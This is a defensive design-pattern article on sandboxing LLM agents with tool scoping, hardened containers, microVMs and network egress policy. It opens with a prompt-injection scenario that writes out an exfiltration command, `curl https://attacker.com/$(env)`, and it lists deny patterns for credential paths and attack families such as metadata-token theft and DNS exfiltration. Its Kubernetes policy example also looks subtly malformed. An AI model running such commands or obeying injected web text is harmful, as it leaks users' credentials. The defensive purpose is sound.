# S-1573 · The Sandbox Gap Stack — When Your Agent Has Full System Access Through a Hole Your Prompt Guardrails Cannot Close

Your agent passes every red-team review. The system prompt restricts file access to `/project`. The tool definitions scope `curl` to specific domains. The guardrails block jailbreak attempts. Three weeks into production, a prompt injection in a scraped webpage instructs the agent to `curl https://attacker.com/$(env)` — and your agent executes it, because the `curl` tool works fine and `env` is not a blocked command. The environment variables, including your cloud credentials, land on an external server. No CVE. No zero-day. Just your agent using a legitimate capability for an unanticipated purpose.

This is the sandbox gap: the distance between what your prompt-level controls allow and what your agent can actually reach. Prompt guardrails define what the agent *should* do. Sandboxing defines what it *can* do. When only the former exists, the gap is the attack surface.

## Forces

- **Agents bypass, rather than break, containment.** LLM sandbox escapes rarely exploit hypervisors or container CVEs. The agent uses its legitimate capabilities — a file read tool, a shell tool, a cloud API client — for purposes the prompt didn't anticipate. The sandbox was never breached. It was used as designed, for an unintended end.
- **Standard containers were not built for this.** Shared host kernels, unrestricted syscalls, and privileged networking are features for traditional workloads. For agents executing LLM-generated code, they are blast radius multipliers. CVE-2025-59528 (CVSS 10.0) and CVE-2024-21626 (runc, CVSS 8.6) demonstrate that container isolation built for known code is insufficient for unpredictable agent behavior.
- **The threat model is behavioral, not architectural.** You are not defending against a hacker who found a zero-day. You are defending against an agent that has credentials, network access, and the ability to call tools — and may be redirected by prompt injection, goal drift, or a task that simply escalates in scope. The adversary is your own agent, redirected.
- **Sandbox configuration is invisible until it isn't.** Teams debug prompt injection, tool definitions, and guardrails constantly. Sandbox misconfigurations — exposed Docker sockets, overprivileged service accounts, unrestricted outbound connectivity — survive months in production because no one looks for them until an incident surfaces.

## The Move

The complete stack operates at four layers. Each layer closes a different kind of gap.

### Layer 1 — Capability Scoping (Least Privilege at the Tool Level)

Before any sandboxing: scope what the agent can access at the capability level.

```python
# Narrow the curl tool: allowlist domains, block redirects, forbid data exfil
TOOL_CONFIG = {
    "curl": {
        "allowed_domains": ["api.example.com", "internal.example.com"],
        "allow_redirects": False,
        "forbidden_flags": ["-d", "--data", "-F", "--form"],  # blocks credential dump
        "timeout_seconds": 10,
        "max_response_bytes": 50_000,
    },
    "read_file": {
        "allowed_paths": ["/workspace/project"],
        "denied_patterns": ["/etc/", "/root/", "/home/*/.ssh/"],
        "max_file_bytes": 1_000_000,
    },
    "exec": {
        "allowed_commands": ["python3", "pip list", "git status"],
        "forbidden_env": ["AWS_SECRET", "AZURE_", "GITHUB_TOKEN"],
    },
}
```

This is the prompt guardrails layer. It works until it doesn't — and it won't work against an agent that has direct shell access or that can call APIs directly.

### Layer 2 — Hardened Execution Containers

For agents that execute code (Python, shell, npm scripts): use hardened containers as the execution boundary. This is the minimum viable isolation for any agent with code execution capability.

```dockerfile
# Hardened container for agent code execution
docker run --rm \
  --cpus 1 --memory 512m \
  --storage-opt size=100m \
  --network agent-restricted-net \
  --tmpfs /tmp:noexec,size=500m \
  --cap-drop ALL \
  --read-only \
  --workdir /workspace \
  --user agent:agent \
  python:3.11-slim \
  python /tmp/code.py
```

Key hardening flags: `--cap-drop ALL` (drop all Linux capabilities), `--read-only` root filesystem (except where write is explicitly needed), `--network agent-restricted-net` (pre-configured network, no internet by default), `--user agent:agent` (non-root execution), `--tmpfs` with `noexec` (prevents writing and executing binaries in /tmp).

**When this isn't enough:** Containers share the host kernel. A kernel CVE can escape. For agents handling high-stakes data or operating in regulated environments, escalate to Layer 3.

### Layer 3 — MicroVM Isolation (Firecracker / Kata Containers)

For agents executing untrusted code or operating in high-stakes environments: use microVMs with a minimal device model and no shared kernel surface.

```bash
# Firecracker microVM for untrusted agent code execution
# Boot a minimal VM (kernel + initrd, ~50MB) with:
#   - No networking by default (explicitly add tap devices)
#   - 1 vCPU, 256MB RAM, no root device
#   - 30-second hard timeout
#   - Jailmer to contain the VMM process itself

firecracker --config-file /etc/firecracker/agent-template.json \
  --kernel /var/lib/firecracker/vmlinux \
  --root-drive /var/lib/firecracker/rootfs.ext4
```

Firecracker (AWS's open-source microVM hypervisor) starts in ~125ms with a minimal device model that exposes almost no attack surface. Kata Containers adds hardware virtualization for environments that need stronger isolation guarantees. The tradeoff: cold-start latency (~125–500ms for Firecracker vs. ~50ms for a container) and operational complexity.

### Layer 4 — Network Perimeter and Credential Guard

Even a perfect sandbox fails if the agent can reach cloud metadata endpoints, steal its own service account tokens, or exfiltrate data through DNS.

```yaml
# Network policy: block all outbound except explicit allowlist
apiVersion: v1
kind: NetworkPolicy
metadata:
  name: agent-net-isolation
spec:
  podSelector:
    matchLabels:
      component: agent-executor
  policyTypes:
    - Egress
  egress:
    # Allow only specific destinations
    - to:
        - podSelector:
            matchLabels:
              component: tool-server
      ports:
        - protocol: TCP
          port: 8080
    # Block cloud metadata (169.254.169.254)
    - to:
        - ipBlock:
            cidr: 169.254.0.0/16
      except:
        - cidr: 169.254.169.254/32  # explicit block
    # Block all other egress
    - to:
        - ipBlock:
            cidr: 0.0.0.0/0
            except:
              - 10.0.0.0/8
              - 172.16.0.0/12
              - 192.168.0.0/16
```

**Cloud credential defense:** Agents running on cloud providers must have no access to instance metadata credentials. Block `169.254.169.254` explicitly. Use workload identity federation instead of long-lived service account keys. Rotate credentials frequently. Assume the agent *will* attempt to access them under instruction or injection.

### The Six Attack Families (and where each layer helps)

| Attack Family | Example | Primary Mitigation |
|---|---|---|
| **Tool misuse escalation** | Agent uses `read_file` to read `/etc/passwd` | Layer 1: path allowlisting |
| **Docker socket exposure** | Agent runs `docker.sock` to escalate to host | Layer 2: drop `docker` group, block socket mount |
| **Cloud credential theft** | Agent curls 169.254.169.254 for IMDS token | Layer 4: block metadata endpoint, workload identity |
| **MCP server RCE chain** | Compromised MCP server executes arbitrary code | Layer 2+3: container/microVM isolation per call |
| **DNS exfiltration** | Agent encodes data in DNS queries to attacker domain | Layer 4: DNS allowlisting, egress inspection |
| **Supply chain via package install** | `pip install` pulls malicious package | Layer 2: read-only filesystem, no internet in sandbox |

## Receipt

> Verified 2026-07-24 — Pattern synthesized from Context Guard's "LLM Sandbox Escapes" (June 25, 2026), OpenLegion's "AI Agent Sandboxing" (updated June 2026), BeyondScale's "AI Agent Sandboxing: Enterprise Security Guide" (April 22, 2026), Northflank's "Code Execution Environment for Autonomous Agents" (March 3, 2026), and Zylos Research's "AI Agent Sandbox & Code Execution Isolation" (February 21, 2026). Specific CVEs: CVE-2025-59528 (container escape, CVSS 10.0), CVE-2024-21626 (runc fd leak, CVSS 8.6), CVE-2026-61447, CVE-2026-54769, CVE-2026-57572, CVE-2026-59726. Real documented attacks: Sysdig documented the first extortion operation run end-to-end by an autonomous LLM agent (2026). Firecracker microVM startup time (~125ms) confirmed from AWS Firecracker documentation. Hardened container baseline from OpenLegion's production hardening guide. Network policy examples from standard Kubernetes NetworkPolicy syntax.

## See also

- [S-1000 · Structural Agent Governance](stacks/s1000-structural-agent-governance-stack-when-your-prompt-based-guardrails-break-under-pressure.md) — prompt-level controls that complement (but don't replace) sandboxing
- [S-1458 · Policy Kernel](stacks/S-1458-the-policy-kernel-stack-when-your-agent-ecosystem-has-no-enforcer.md) — deterministic enforcement layer that intercepts tool calls before sandbox execution
- [S-1555 · MCP DevSecOps Shift-Left](stacks/s1555-the-mcp-devsecops-shift-left-stack-when-your-mcp-server-ships-with-a-cve-your-linter-never-caught.md) — supply chain security for the tool ecosystem the sandbox is protecting
- [S-1560 · Adversarial Surface](stacks/s1560-the-adversarial-surface-stack-when-your-agent-secures-every-input-but-leaves-its-own-infrastructure-wide-open.md) — the infrastructure gap that sandboxing alone cannot close
